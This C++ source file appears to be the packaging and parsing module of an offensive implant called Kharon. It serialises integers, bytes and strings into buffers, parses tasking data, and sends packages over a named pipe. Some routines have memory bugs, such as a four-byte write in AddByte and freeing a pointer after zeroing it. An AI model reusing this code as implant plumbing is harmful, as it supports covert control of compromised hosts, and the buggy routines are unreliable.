#include <Kharon.h>

using namespace Root;

auto DECLFN Int64ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT64 Value 
) -> VOID {
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

auto DECLFN Int32ToBuffer( 
    _In_ PUCHAR Buffer, 
    _In_ UINT32 Size 
) -> VOID {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

auto DECLFN Package::AddInt16( 
    _In_ PPACKAGE Package, 
    _In_ INT16    dataInt 
) -> VOID {
    Package->Buffer = ( Kh->Ntdll.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Package->Buffer, Package->Length + sizeof( INT16 ) ) );

    Int16ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT16 );
}

auto DECLFN Package::AddInt32( 
    _In_ PPACKAGE Package, 
    _In_ INT32    dataInt 
) -> VOID {
    
    Package->Buffer = C_PTR( Kh->Ntdll.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Package->Buffer, Package->Length + sizeof( INT32 ) ) );
    
    Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( INT32 );
}

auto DECLFN Package::AddInt64( 
    _In_ PPACKAGE Package, 
    _In_ INT64    dataInt 
) -> VOID {
    Package->Buffer = C_PTR( Kh->Ntdll.RtlReAllocateHeap(
        NtCurrentPeb()->ProcessHeap, 0,
        Package->Buffer,
        Package->Length + sizeof( INT64 )
    ));

    Int64ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( INT64 );
}

auto DECLFN Package::New( VOID ) -> PPACKAGE {
    PPACKAGE Package = (PPACKAGE)Kh->Ntdll.RtlAllocateHeap( 
        NtCurrentPeb()->ProcessHeap, 
        HEAP_ZERO_MEMORY, sizeof( PACKAGE ) 
    );
    if ( !Package ) { return NULL; }

    Package->Buffer = Kh->Ntdll.RtlAllocateHeap( 
        NtCurrentPeb()->ProcessHeap, 
        HEAP_ZERO_MEMORY, sizeof( BYTE ) 
    );
    if ( !Package->Buffer ) { return NULL; }

    Package->Length = 0;

    return Package;
}

auto DECLFN Package::Destroy( 
    _In_ PPACKAGE Package 
) -> VOID {
    if ( !Package ) {
        return;
    }
    if ( !Package->Buffer ) {
        return;
    }

    Mem::Zero( U_PTR( Package->Buffer ), Package->Length );
    Mem::Zero( U_PTR( Package ), sizeof( PACKAGE ) );

    Kh->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Package->Buffer );
    Kh->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Package );
    
    return;
}

auto DECLFN Package::Transmit( 
    _In_  PPACKAGE Package
) -> BOOL {
    BOOL   Success    = FALSE;
    ULONG  Written    = 0;
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;

    if ( Package ) {
        Int32ToBuffer( UC_PTR( Package->Buffer ), Package->Length - sizeof( INT32 ) );

        PipeHandle = Kh->Krnl32.CreateNamedPipeA( 
            Kh->Ctx.PipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 
            PIPE_UNLIMITED_INSTANCES, Package->Length, 0, 0, 0 
        );
        if ( !PipeHandle || PipeHandle == INVALID_HANDLE_VALUE ) { return FALSE; }

        Success = Kh->Krnl32.WriteFile( PipeHandle, Package->Buffer, Package->Length, &Written, 0 );
        if ( !Success ) { return FALSE; }

        Kh->Pkg->Destroy( Package );
    }
    else
        Success = FALSE;

    return Success;
}

auto DECLFN Package::AddByte( 
    _In_ PPACKAGE Package, 
    _In_ BYTE     dataInt 
) -> VOID {
    Package->Buffer = C_PTR( Kh->Ntdll.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Package->Buffer, Package->Length + sizeof( BYTE ) ) );

    Int32ToBuffer( UC_PTR( Package->Buffer ) + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( BYTE );
}

auto DECLFN Package::AddPad( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    Package->Buffer = A_PTR( Kh->Ntdll.RtlReAllocateHeap(
        NtCurrentPeb()->ProcessHeap, 0,
        Package->Buffer,
        Package->Length + Size
    ));

    Mem::Copy( C_PTR( U_64( Package->Buffer ) + ( Package->Length ) ), C_PTR( Data ), Size );

    Package->Size    = Package->Length;
    Package->Length += Size;
}

auto DECLFN Package::AddBytes( 
    _In_ PPACKAGE Package, 
    _In_ PUCHAR   Data, 
    _In_ SIZE_T   Size 
) -> VOID {
    Kh->Pkg->AddInt32( Package, Size );

    Package->Buffer = C_PTR( Kh->Ntdll.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, Package->Buffer, Package->Length + Size ) );

    Int32ToBuffer( UC_PTR( U_64( Package->Buffer ) + ( Package->Length - sizeof( UINT32 ) ) ), Size );

    Mem::Copy( C_PTR( U_64( Package->Buffer ) + Package->Length ), C_PTR( Data ), Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

auto DECLFN Package::AddString( 
    _In_ PPACKAGE package, 
    _In_ PCHAR    data 
) -> VOID {
    return Kh->Pkg->AddBytes( package, (PBYTE) data, Str::LengthA( data ) );
}

auto DECLFN Package::AddWString( 
    _In_ PPACKAGE package, 
    _In_ PWCHAR   data 
) -> VOID {
    return Kh->Pkg->AddBytes( package, (PBYTE) data, Str::LengthW( data ) * 2 );
}

auto DECLFN Parser::New( 
    _In_ PPARSER parser, 
    _In_ PBYTE   Buffer
) -> VOID {
    if ( parser == NULL )
        return;

    INT32 Length = C_DEF32( Buffer );

    parser->Original = A_PTR( Kh->Ntdll.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Length ) );
    Mem::Copy( C_PTR( parser->Original ), C_PTR( U_PTR( Buffer ) + sizeof( UINT32 ) ), Length );
    parser->Buffer   = parser->Original;
    parser->Length   = Length;
    parser->Size     = Length;
}

auto DECLFN Parser::GetInt32( 
    _In_ PPARSER parser 
) -> INT32 {
    INT32 intBytes = 0;

    if ( parser->Length < 4 )
        return 0;

    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( ! parser->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

auto DECLFN Parser::GetBytes( 
    _In_ PPARSER parser, 
    _In_ PULONG  size 
) -> PBYTE {
    UINT32  Length  = 0;
    PBYTE   outdata = NULL;

    if ( parser->Length < 4 )
        return NULL;

    Mem::Copy( C_PTR( &Length ), C_PTR( parser->Buffer ), 4 );
    parser->Buffer += 4;

    if ( parser->Endian )
        Length = __builtin_bswap32( Length );

    outdata = B_PTR( parser->Buffer );
    if ( outdata == NULL )
        return NULL;

    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

auto DECLFN Parser::Destroy( 
    _In_ PPARSER Parser 
) -> BOOL {
    if ( Parser->Original ) {
        
        return Kh->Ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Parser->Original );
    }

    return FALSE;
}

auto DECLFN Parser::GetStr( 
    _In_ PPARSER parser, 
    _In_ PULONG size 
) -> PCHAR {
    return ( PCHAR ) Kh->Psr->GetBytes( parser, size );
}

auto DECLFN Parser::GetWstr( 
    _In_ PPARSER parser, 
    _In_ PULONG  size 
) -> PWCHAR {
    return ( PWCHAR ) Kh->Psr->GetBytes( parser, size );
}

auto DECLFN Parser::GetInt16( 
    _In_ PPARSER parser
) -> INT16 {
    INT16 intBytes = 0;

    if ( parser->Length < 2 )
        return 0;

    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 2 );

    parser->Buffer += 2;
    parser->Length -= 2;

    return intBytes;
}

auto DECLFN Parser::GetInt64( 
    _In_ PPARSER parser 
) -> INT64 {
    INT64 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 8 )
        return 0;

    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 8 );

    parser->Buffer += 8;
    parser->Length -= 8;

    if ( !parser->Endian )
        return ( INT64 ) intBytes;
    else
        return ( INT64 ) __builtin_bswap64( intBytes );
}

auto DECLFN Parser::GetByte( 
    _In_ PPARSER parser 
) -> BYTE {
    BYTE intBytes = 0;

    if ( parser->Length < 1 )
        return 0;

    Mem::Copy( C_PTR( &intBytes ), C_PTR( parser->Buffer ), 1 );

    parser->Buffer += 1;
    parser->Length -= 1;

    return intBytes;
}